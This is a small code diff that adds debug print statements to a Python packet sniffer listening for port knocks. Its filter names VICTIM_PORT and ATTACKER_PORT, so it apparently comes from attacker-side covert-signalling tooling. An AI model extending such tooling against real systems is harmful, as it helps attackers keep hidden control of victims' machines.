@@ -21,6 +21,7 @@ def in_time():
 
 
 def sniff_knocks(packet):
+    print ("Checking packet for knock")
     global knock_number
     global knock_timer
     # If knock_1 rest knock_number and start timer.
@@ -48,6 +49,7 @@ def sniff_knocks(packet):
 
 
 def main():
+    print ("Listening for Knocks!")
     sniff(filter="udp and src port " + str(VICTIM_PORT) + " and dst port " + str(ATTACKER_PORT), prn=sniff_knocks)
 
 
